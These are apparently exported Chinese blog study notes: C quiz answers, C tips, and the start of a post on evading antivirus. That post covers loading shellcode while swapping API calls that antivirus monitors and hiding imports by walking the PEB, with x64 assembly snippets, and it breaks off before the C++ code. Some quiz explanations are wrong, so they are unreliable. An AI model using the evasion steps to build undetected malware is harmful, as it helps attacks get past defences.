<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum A &#123;a1,a2,a3,a4&#125;;//c语言在定义的时候会根据这些元素的顺序定义一个默认值，分别为0.1.。。。。</span><br><span class="line">enum B &#123; b1=3, b2, b3, b4=5 &#125;;//定义枚举类型的时候可以为枚举元素指定一个值，为指定值的元素将是前一个元素+1</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    enum A w = a2;</span><br><span class="line">    enum B w2 = b2;</span><br><span class="line">    printf(&quot;%d,%d,%d\n&quot;, a2, a3, b2);//输出124</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个是博客中的一些总结。看了就会明白了。</p>
<h2 id="5-8"><a href="#5-8" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5、以下C语言共用体类型数据的描述中，不正确的是（ D ）</span><br><span class="line">A、共用体变量占的内存大小等于所需内在最大的成员所占的内存</span><br><span class="line">B、共用体类型可以出现在结构体类型定义中</span><br><span class="line">C、在定义共用体变量的同时允许对另一个成员的值进行初始化</span><br><span class="line">D、同一共用体中各成员的首地址不相同</span><br></pre></td></tr></table></figure>

<p>值得注意的是，共用体的所有成员所使用的内存的开头地址的值都是一样的，所以当我们对其中一个成员赋值时，会把这个变量中原油数据诶给覆盖掉</p>
<p>在共用体中，所有成员共享同一块内存空间。共用体变量的内存大小取决于最大的成员所需的内存大小。共用体类型可以出现在结构体类型定义中，可以在定义共用体变量的同时对另一个成员进行初始化。</p>
<p>然而，共用体的不同成员可能具有不同的类型和长度，但它们共享相同的起始地址，因此同一共用体中各成员的首地址是相同的。</p>
<h2 id="6-7"><a href="#6-7" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6、若有以下类型说明，叙述正确的是（ C ）</span><br><span class="line">typedef sturct&#123; </span><br><span class="line">int num;</span><br><span class="line">char  *name;</span><br><span class="line">int score;</span><br><span class="line">&#125; STU, *PSTU</span><br><span class="line">A、STU 是变量名       B、PSTU是变量名</span><br><span class="line">C、PSTU是指向结构体类型STU的指针类型名</span><br><span class="line">D、类型说明语句有错误</span><br></pre></td></tr></table></figure>

<p>这个简单啊</p>
<p><code>typedef int count</code>这个时候count就代表的是int类型的数据。<code>count a = 3;</code>这个a就是个整型数据。</p>
<ul>
<li><code>STU</code> 是一个结构体类型名，包含了 <code>int num</code>、<code>char *name</code> 和 <code>int score</code> 这三个成员。使用 <code>STU</code> 可以声明结构体类型的变量，比如 <code>STU stu1;</code>。</li>
<li><code>PSTU</code> 是一个指针类型名，它是指向 <code>STU</code> 类型的指针。也就是说，<code>PSTU</code> 可以用来声明指向结构体的指针变量，比如 <code>PSTU pStu;</code>。</li>
</ul>
<h2 id="7-7"><a href="#7-7" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7、设有如下定义语句：</span><br><span class="line">union u-type&#123;</span><br><span class="line">int i;            </span><br><span class="line">  double x;         </span><br><span class="line">  float f;           </span><br><span class="line">&#125;;  </span><br><span class="line">struct  str-type&#123;</span><br><span class="line">char str[100];</span><br><span class="line">union u_type u[2];</span><br><span class="line">&#125;;</span><br><span class="line">则语句“printf(“%d”, sizeof(struct str-type) );”的输出结果是（ B ）</span><br><span class="line">A、100      B、116</span><br><span class="line">C、120      D、200</span><br></pre></td></tr></table></figure>

<h2 id="8-7"><a href="#8-7" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下列对结构体类型变量定义不正确的是（ C ）。</span><br><span class="line"></span><br><span class="line">A.struct teacher&#123;int num; int age;&#125;teach1;B.struct &#123;int num; int age;&#125;teach1,teach2;C.struct &#123;int num; int age;&#125;teacher; struct teacher teach1;D.struct teacher &#123;int num; int age;&#125;; struct teacher teach1;</span><br></pre></td></tr></table></figure>

<p>c不用看都晓得错了</p>
<h2 id="9-7"><a href="#9-7" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9．若有定义</span><br><span class="line">struct node&#123;</span><br><span class="line">int date;</span><br><span class="line">struct node *next;</span><br><span class="line">&#125;</span><br><span class="line">函数：</span><br><span class="line">void fun(struct node *head)</span><br><span class="line">&#123;</span><br><span class="line">struct node *p=head;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">       struct node *q=p-&gt;next;</span><br><span class="line">       free(p);</span><br><span class="line">p=q;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">则该函数的功能是（ A ）</span><br><span class="line">A. 删除整个单向链表               B. 删除单向链表中的一个结点</span><br><span class="line">C．显示单向链表中的所有数据       D. 创建单向链表</span><br></pre></td></tr></table></figure>

<p>挨个free元素，所以是删除整个单向链表。</p>
<h2 id="10-5"><a href="#10-5" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 对枚举类型进行定义，不正确的是（  ）。</span><br><span class="line"></span><br><span class="line">A. enum b&#123;1, 2, 3&#125;;</span><br><span class="line"></span><br><span class="line">B. enum a&#123;A, B, C&#125;;</span><br><span class="line"></span><br><span class="line">C. enum c&#123;D=3, E, F&#125;;</span><br><span class="line"></span><br><span class="line">D. enum d&#123;X=0, Y=5, Z=9&#125;;</span><br></pre></td></tr></table></figure>

<p>A 错</p>
<p>枚举类型列表中的都是标识符。</p>
<p>还记得标识符的命名要求吗？ 不能以数字开头</p>
<p>几把这些题好多都是错的，还要我一个一个搜索，真该死啊这个学长，题给我都不检查一下，纯骗子，等我入学了😋再来慢慢说他好吧，别被逮着内网有漏洞哈</p>
<h2 id="11-5"><a href="#11-5" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11.下面程序的输出结果为(C)</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	enum Weekday &#123; sum = 7, mon = 1, tue, thu, fri, sat &#125;;</span><br><span class="line">	enum Weekday day = sat;</span><br><span class="line">	printf(&quot;%d\n&quot;, day);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">A.7         B.6          C.5         D.4 </span><br></pre></td></tr></table></figure>

<p>这个是依次定义的，所以输出5，12345.</p>
<h2 id="12-5"><a href="#12-5" class="headerlink" title="12"></a>12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12.以下程序的运行结果（D）</span><br><span class="line">#include&lt;stdio.h&gt; </span><br><span class="line">union utype&#123;</span><br><span class="line">int i;</span><br><span class="line">float f</span><br><span class="line">&#125;U[2];</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">printf(“sizeof(u):%d\n”,sizeof(u)) ;</span><br><span class="line">&#125;</span><br><span class="line">A. 2          B.  4         C.6          D. 8</span><br></pre></td></tr></table></figure>

<p><code>union</code> 是一种特殊的数据类型，在内存中它所有的成员共用同一块内存空间。根据内存对齐的规则，一个 <code>union</code> 的大小等于其包含的成员中占用内存最大的那个成员的大小。在这个程序中，<code>union u</code> 包含有两个成员，一个是 <code>int</code> 类型的 <code>i</code>，一个是 <code>float</code> 类型的 <code>f</code>。<code>sizeof(U)</code> 的结果就是 <code>union u</code> 的大小，根据最大成员的大小为 <code>4</code>，因此程序输出的结果是 8。</p>
<h2 id="13-5"><a href="#13-5" class="headerlink" title="13"></a>13</h2><p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230911085818138.png" alt="image-20230911085818138"></p>
<p>题目要求是保留其他节点，所以我们要先把p之后的节点位置传输给p之前的pnext，也就是p的next赋值给head的next，然后就可以直接删除p了。所以选a</p>
<h2 id="14-3"><a href="#14-3" class="headerlink" title="14"></a>14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">14.若有定义</span><br><span class="line">struct node&#123;</span><br><span class="line">int data;</span><br><span class="line">struct node *next;</span><br><span class="line">&#125;;</span><br><span class="line">及函数： void fun(struct node *head)</span><br><span class="line">&#123;</span><br><span class="line">struct node *p=head;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">   printf(“%d”,p-&gt;data);</span><br><span class="line">   p=p-&gt;next;</span><br><span class="line">   break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">则函数　fun（　）的功能是（ C  ）</span><br><span class="line">A. 删除单向链表                 B. 显示单向链表中的所有数据</span><br><span class="line">C. 显示单向链表中的第一个数据   D. 创建单向链表</span><br></pre></td></tr></table></figure>

<p>由于while最后有个break，所以本来是显示所有数据的函数，变成了只展示第一个数据的函数，</p>
<h2 id="15-3"><a href="#15-3" class="headerlink" title="15"></a>15</h2><p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230911090531013.png" alt="image-20230911090531013"></p>
<p>这个也不多说了，就是计算节点个数</p>
<h2 id="16-3"><a href="#16-3" class="headerlink" title="16"></a>16</h2><p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230911090641993.png" alt="image-20230911090641993"></p>
<p>链表的第二个节点就是，head.next指向的节点。插入进去，需要修改head.next和p.next。p.next改成原来的第二个节点，head.next改成现在的节点。</p>
<p>所以选c。</p>
<p>后面还有个题库我就不总结了，也是单选题的，判断题和其他大题或许会总结一下？另外一个单选题的我自己过一遍就好了。</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>C语言小tips</title>
    <url>/2023/09/30/C%E8%AF%AD%E8%A8%80%E5%B0%8Ftips/</url>
    <content><![CDATA[<h1 id="C语言小tips"><a href="#C语言小tips" class="headerlink" title="C语言小tips"></a>C语言小tips</h1><p>记一下小知识，方便随时看看。</p>
<h1 id="strcmp函数"><a href="#strcmp函数" class="headerlink" title="strcmp函数"></a>strcmp函数</h1><p>C 库函数 <strong>int strcmp(const char *str1, const char *str2)</strong> 把 <strong>str1</strong> 所指向的字符串和 <strong>str2</strong> 所指向的字符串进行比较。</p>
<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>该函数返回值如下：</p>
<ul>
<li>如果返回值小于 0，则表示 str1 小于 str2。</li>
<li>如果返回值大于 0，则表示 str1 大于 str2。</li>
<li>如果返回值等于 0，则表示 str1 等于 str2。</li>
<li>特别注意：<strong>strcmp(const char *s1,const char * s2)</strong> 这里面只能比较字符串，即可用于比较两个字符串常量，或比较数组和字符串常量，不能比较数字等其他形式的参数。</li>
</ul>
<h1 id="getchar和putchar"><a href="#getchar和putchar" class="headerlink" title="getchar和putchar"></a>getchar和putchar</h1><p>C 库函数 <strong>int putchar(int char)</strong> 把参数 char 指定的字符（一个无符号字符）写入到标准输出 stdout 中。（就是向屏幕输出一个字符）</p>
<p>C 库函数 <strong>int getchar(void)</strong> 从标准输入 stdin 获取一个字符（一个无符号字符）。这等同于 <strong>getc</strong> 带有 stdin 作为参数。</p>
<h1 id="fseek-函数"><a href="#fseek-函数" class="headerlink" title="fseek 函数"></a>fseek 函数</h1><p>函数名：fseek函数<br>头文件：#include&lt;stdio.h&gt;<br>功能：把与fp有关的文件位置指针放到一个指定位置。<br>格式： int fseek(FILE *stream, long offset, int fromwhere);<br>范例一：fseek(fp, 0L, SEEK_END);<br>解释：文件指针定位到文件末尾，偏移0个字节</p>
<p>范例二： fseek(fp,50L,0)；或fseek(fp,50L,SEEK_SET);<br>解释：其作用是将位置指针移到离文件头50个字节处</p>
<p>起始点 SEEK_SET K_CUR SEEK_END<br>对应的数字 0 1 2<br>代表的文件位置 文件开头 文件当前位置 文件末尾</p>
<p><strong>注意：</strong><br>fseek函数的文件指针，应该为已经打开的文件。如果没有打开的文件，那么将会出现错误。</p>
<p>**值得说明的是,fseek() 一般用于二进制文件,在文本文件中由于要进行转换,计算的位置有时会出错。 **</p>
<h1 id="gets函数"><a href="#gets函数" class="headerlink" title="gets函数"></a>gets函数</h1><p><strong>gets()函数是一次可以读取多个字符的函数</strong>，而不是一次只能读取一个字符。gets()函数是用于从标准输入流（stdin）中读取字符串的函数，它会一直读取字符，直到遇到换行符或者到达文件末尾时为止。</p>
<h1 id="puts函数"><a href="#puts函数" class="headerlink" title="puts函数"></a>puts函数</h1><p>C 库函数 <strong>int puts(const char *str)</strong> 把一个字符串写入到标准输出 stdout，直到空字符，但不包括空字符。换行符会被追加到输出中。</p>
<h1 id="一般杂项"><a href="#一般杂项" class="headerlink" title="一般杂项"></a>一般杂项</h1><h2 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h2><p>在C语言中，使用科学计数法表示数值需要在数值后面加上字母e或E，再加上指数。例如，1.23e4表示的是1.23乘以10的4次方，即12300，而4.56E-3表示的是4.56乘以10的负3次方，即0.00456。</p>
<p>注意，指数可以是正整数、负整数或0，但是不能包含小数点。如果指数是0，可以省略掉e或E后面的0，例如1e0可以简写为1。</p>
<h2 id="数组名"><a href="#数组名" class="headerlink" title="数组名"></a>数组名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个数组确实是由连续的一块内存单元组成的，这是数组的特性之一。</span><br><span class="line">但是，指针变量并不一定是数组的首地址。</span><br><span class="line">在 C 语言中，数组名被解释为指向数组第一个元素的指针。</span><br><span class="line">这意味着数组名可以用作指针来访问数组中的元素。</span><br><span class="line">然而，这并不意味着数组的指针变量就一定是数组的首地址。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/30/C%E8%AF%AD%E8%A8%80%E5%B0%8Ftips/image-20230927103037170-1696080322840.png" alt="image-20230927103037170"></p>
<h2 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h2><p><strong>条件表达式不能取代一般if的语句</strong>，条件表达式只能取代两个同样类型值的表达式的。<br>对于两个不同类型值的表达式，是不能用条件表达式进行取代的。</p>
<h2 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h2><p><strong>C语言允许用字符串的方式对数组作初始化赋值。</strong></p>
<h2 id="if语句tips（重点）"><a href="#if语句tips（重点）" class="headerlink" title="if语句tips（重点）"></a>if语句tips（重点）</h2><p>if(a=5) 是允许的。（1分） 正确(重点)</p>
<h2 id="杂项中的杂项"><a href="#杂项中的杂项" class="headerlink" title="杂项中的杂项"></a>杂项中的杂项</h2><p>在C语言中能逐个地使用下标变量，也能一次引用整个数组。（1分） 错误</p>
<p>逻辑表达式的值只能为1或0。（1分）正确</p>
<p>continue 只能用于循环体中。（1分） 正确</p>
<p>凡在函数中未指定存储类别的局部变量，默认的存储类别是自动存储类别（auto）</p>
<p>一个变量的地址称为该变量的指针（1分） 正确</p>
<p>变量被定义后 , 它的作用域和寿命就被确定了 , 并且不可改变。 </p>
<p>在switch语句中，多个case可以共用一组执行语句。</p>
<p>文件是否打开是可以判断的。（1分） 正确</p>
<p>在多层循环中, 一个break语句只向外跳一层。（1分） 正确</p>
<p>以“a”方式打开一个文件时，文件指针指向文件首。（1分）错误  <strong>解析</strong>：文件打开时，原有文件内容不被删除，位置指针移到文件末尾，可以进行添加或读操作</p>
<p>寄存器类变量的作用域和寿命与自动类变量的相同。 （1分） 正确</p>
<p>结构体名在定义结构体时不可省略。（1分）错误</p>
<p>变量的类型通常指存储类和数据类型两种。 （1分） 正确</p>
<p>不允许把一个数值或字符赋予指针变量（1分） 正确</p>
<p>两指针变量相减所得之差是两个指针所指数组元素之间相差的元素个数（1分） 正确</p>
<p>C 语言标准格式输出函数 printf() 的参数表是由若干个表达式组成。 （1分） 正确</p>
<p>一个变量的数据类型被强制转换后，它将保持被强制转换后的数据类型。（1分）错误</p>
<p><strong>内部静态类</strong>变量的作用域和寿命与<strong>自动类变量</strong>是不同的。内部静态类变量的寿命更长，会在多次函数调用中保持其值。</p>
<p>字符串在内存中的<strong>起始地址</strong>称为字符串的指针，可以定义一个字符指针变量指向一个字符串（1分） 正确</p>
<p>分号是C语句之间的分隔符，不是语句的一部分  <strong>错误</strong></p>
<p>++(i+1);是<strong>非法</strong>的赋值语句</p>
<p>C语言中有逻辑类型  错误 </p>
<p>假定x和y为double型，则表达式x=2,y=x+3/2的值是3.500000  错误，是3.000000</p>
<p>可以用关系运算符对字符串的大小进行比较   <strong>错误</strong></p>
<p>除逗号运算符外，赋值运算符的优先级最低   <strong>正确</strong></p>
<p>sizeof(double)是一种函数调用   错误，为整型数据</p>
<p>当程序执行中，数组元素的下标超出所定义的下标范围时，系统将给出“下标越界”的出错信息   错误</p>
<p>若有说明int s[3][4]={0};则只有元素s[0][0] 可得到初值0。  错误（所有的元素都是0）如果是1的话也是全部都是1，如果是1，2的话，其他没被赋值的元素就全部都是0</p>
<p> 在一个函数内定义的变量只在本函数范围内有效   正确</p>
<p> 函数的形参和实参分别占用不同的存储单元   错误（他们占用的存储单元是相同的哦，如果在函数内部用指针改变外部的函数，外部的函数同样会发生改变，这就是为什么相同）</p>
<p>若有以下函数调用语句： fun(a+b,(x,y),fun(n+k,d,(a,B)));在此函数调用语句中实参的个数是6  错误，3（在函数调用语句中，每个逗号分隔的表达式都被视为一个独立的实参）</p>
<p>当调用函数时，实参是一个数组名，则向函数传送的是数组的首地址  正确</p>
<p>C语言中，宏替换没有数据类型限制   正确</p>
<p>在 C 语言中，我们可以使用八进制转义序列来表示一个字符常量。在这种情况下，转义序列由反斜杠（\）后面跟着<strong>一到三个</strong>八进制数字组成。</p>
<p>C语言中，每个函数都可以被其它函数调用(包括main函数)   错误</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>C语言3-IAT表、shellcode loader</title>
    <url>/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/</url>
    <content><![CDATA[<h1 id="C语言3-IAT表、shellcode-loader"><a href="#C语言3-IAT表、shellcode-loader" class="headerlink" title="C语言3-IAT表、shellcode loader"></a>C语言3-IAT表、shellcode loader</h1><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p><img src="/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122426842.png" alt="image-20240119122426842"></p>
<p>用名称找函数就放在INT表里面，如果是地址找函数就凡在IAT表里面，虽然我也不是很懂，pe结构我学了几天了，暂时不想学了，后面再补上。</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119122609063.png" alt="image-20240119122609063"></p>
<p>在pe加载进内存之后，iat表里面就不再指向函数的名称了，而是存储到函数的地址</p>
<h2 id="正常加载函数和dll加载函数"><a href="#正常加载函数和dll加载函数" class="headerlink" title="正常加载函数和dll加载函数"></a>正常加载函数和dll加载函数</h2><p>现在看看正常函数调用的反汇编<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119123043585.png" alt="image-20240119123043585"></p>
<p>可以看到他的内存是写死了的，但是我们看看调用windowsAPI哈，这个就是跳到dll<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135902769.png" alt="image-20240119135902769"><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119135924070.png" alt="image-20240119135924070"><br>继续往下更进<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119140048733.png" alt="image-20240119140048733"><br>最后发现跳到一个7开头的内存地址，这个7开头的内存地址绝对不是程序本身的内存地址了，就是不再程序的堆栈里面，因为可以看到刚刚我们的反汇编里面，基本都是0开头的，所以这个7开头的肯定是dll里面去了。<br>这里解释一下，由于程序加载进内存的时候，还会加载很多的dll，而为了防止出错，程序不会把任何两个dll文件加载进同一块内存中。可是这个时候就出现了一个问题，如果我本来存dll的内存块被我自己的一个dll文件占领了呢？那么，就会把原来存在这个dll挤开，所以dll的地址都是动态的，存到内存中的，就像上面那张图片，call到一个内存地址中取，而那个地址就存有目标dll的内存地址。</p>
<h2 id="从导入表查看函数"><a href="#从导入表查看函数" class="headerlink" title="从导入表查看函数"></a>从导入表查看函数</h2><p>这里使用vs自带的dumpbin来看看<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144844766.png" alt="image-20240119144844766"><br>命令如下<code>dumpbin.exe /imports 目标文件路径</code><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240119144951384.png" alt="image-20240119144951384"><br>可以看到哈（用的就是上面那个程序），这里就可以从导入表看到这个这个东西。</p>
<h1 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h1><p>我之前其实作为门外汉研究过平时的shellcode loader代码，在我的blog里面其实也有写，可以看看。当时还局限于加密解密shellcode，现在系统学习免杀，不断提高捏。</p>
<p>要搜这些api的官方文档用msdn就可，不是csdn哈。<br>而shellcode loader的编写也有两种方法，可以用指针执行，也可以用汇编语句执行。<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120153125419.png" alt="image-20240120153125419"><br>其中对于免杀来说，类似VirtualAlloc  CreateThread Write ProcessMemory这些api肯定是被重点监控的，我们可以进行一些替换例如VirtualAlloc</p>
<p>虽然可以替换api，但是本质上，要让shellcode跑起来，必须要一块可读可写可执行的内存对吧，所以我们替换这些api，其实只是让杀软不那么在意你申请的内存，因为上面的api都是些敏感的api了。</p>
<h2 id="回调函数机制"><a href="#回调函数机制" class="headerlink" title="回调函数机制"></a>回调函数机制</h2><p>把一段可执行的代码像参数传递那样给其他代码，而这段代码会在某个时刻被调用执行，这就叫做回调。如果代码立即被执行就称为同步回调，如果在之后晚点的某个时间再执行，则称之为异步回调。<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240120155029039.png" alt="image-20240120155029039"></p>
<p>同样图片中的</p>
<p>扩展：defender有内存查杀，但是360没有</p>
<h2 id="经典的隐藏导入表"><a href="#经典的隐藏导入表" class="headerlink" title="经典的隐藏导入表"></a>经典的隐藏导入表</h2><h3 id="双机调试环境"><a href="#双机调试环境" class="headerlink" title="双机调试环境"></a>双机调试环境</h3><p>扩展：搭建双机调试环境（可以自己看看百度）  windbg</p>
<p>每个线程都有一个TEB结构来存储线程的一些属性结构，TEB的地址用fs:[0]来获取</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192853804.png" alt="image-20240121192853804"></p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121192942895.png" alt="image-20240121192942895"></p>
<p>很好，开始看不懂了。哦，懂了，就是就是我们要定位一个dll的地址的话，可以进行如下操作<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193151924.png" alt="image-20240121193151924"><br>这个就要用那个双机调试环境，具体可以百度（我后续会单独发文）</p>
<h3 id="64位环境定位PEB内部的dll地址实践"><a href="#64位环境定位PEB内部的dll地址实践" class="headerlink" title="64位环境定位PEB内部的dll地址实践"></a>64位环境定位PEB内部的dll地址实践</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先我要在这里说说这个的原理是什么啊，就是说导入表会检查我们程序用了哪些dll对吧，因为dumpbin其实就是通过检查pe文件的导入表来看你这个pe文件用了哪些函数对吧<br>那接下来我们介绍一下导入表<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121230255105.png" alt="image-20240121230255105"></p>
<p><a href="https://www.cnblogs.com/LyShark/p/17679082.html">2.5 PE结构：导入表详细解析 - lyshark - 博客园 (cnblogs.com)</a></p>
<p>具体可以看上面那个博客，讲的非常详细，虽然我看的一知半解的，但是还是继续学下去。</p>
<p>好吧，继续说会话题，主动找到函数地址来调用函数不会记录到导入表，而怎么找到函数地址呢，那就需要使用GetProAddress函数了，这个函数在kernel32.dll里面，我们就需要手动定位这个dll里面的函数地址就可以了，步骤如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取 InInitializationOrderModuleList 地址</span><br><span class="line">遍历 InInitializationOrderModuleList 获取 EXE 运行自动加载的 Kernel32.dll 地址</span><br><span class="line">遍历 Kernel32.dll 导出表，获取 GetProcAddress 函数地址</span><br><span class="line">通过 GetProcAddress 地址调用 GetProcAddress 函数获取其他必要函数地址</span><br><span class="line">通过必要函数地址调用必要函数加载 ShellCode</span><br></pre></td></tr></table></figure>



<h4 id="实践之获取PEB位置"><a href="#实践之获取PEB位置" class="headerlink" title="实践之获取PEB位置"></a>实践之获取PEB位置</h4><p><a href="https://www.cnblogs.com/zUotTe0/p/11421173.html">通过PEB寻找函数地址 - Bl0od - 博客园 (cnblogs.com)</a></p>
<p>可参考</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193340506.png" alt="image-20240121193340506"><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121193759404.png" alt="image-20240121193759404"><br>好好好，这些都要自己去实践才行，但是又特别枯燥，很烦，坚持下去把。这里实践一下哈</p>
<p>首先打开你的vs，创建一个新的文件，用来存储汇编代码</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121194615296.png" alt="image-20240121194615296"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.CODE</span><br><span class="line">	GetPEB PROC</span><br><span class="line">	mov rax,gs:[60h]</span><br><span class="line">	ret </span><br><span class="line">	GetPEB ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>这段汇编代码是用于获取进程环境块（Process Environment Block，PEB）的函数。PEB是Windows操作系统中的一个数据结构，记录了当前进程的各种信息和状态。</p>
<p>具体来说，这段代码的功能是通过读取gs寄存器的偏移地址0x60处的值，将其保存到rax寄存器中，并返回。在Windows x64平台上，gs寄存器用于指向当前线程的Thread Information Block（TIB），而TIB中的一个成员就是PEB的地址。</p>
<p>通过这个函数，可以方便地获取进程的PEB结构体，从而获得进程的重要信息，如模块列表、命令行参数等。</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195141499.png" alt="image-20240121195141499"><br>第二步就是进入这个文件的属性页面，然后设置将其在生成中排除设置成否。就相当于要和我们一起生成<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121195250452.png" alt="image-20240121195250452"><br>然后就是将这个改成自定义生成工具，应用一下。</p>
<p>然后在出现的自定义生成工具中填两项，如下<br>命令行:<code>ml64 /Fo $(IntDir)%(fileName).obj /c %(filename).asm</code><br>输出：<code>$(IntDir)%(fileName).obj</code><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121200005252.png" alt="image-20240121200005252"><br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213201284.png" alt="image-20240121213201284"></p>
<p>然后导入（记得加分号）<br><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240121213557248.png" alt="image-20240121213557248"><br>最后运行，成功拿到PEB的地址，当然，这只是第一步，我们的目标是什么，是拿到函数地址！</p>
<h4 id="获取-x64-InInitializationOrderModuleList-地址"><a href="#获取-x64-InInitializationOrderModuleList-地址" class="headerlink" title="获取 x64_InInitializationOrderModuleList 地址"></a>获取 x64_InInitializationOrderModuleList 地址</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h] ; PEB，不能写 0x60</span><br><span class="line">    mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">    mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">    ret ; 不能写 retn</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>这个汇编代码就会返回链表的头指针。</p>
<p>cpp代码如下：</p>
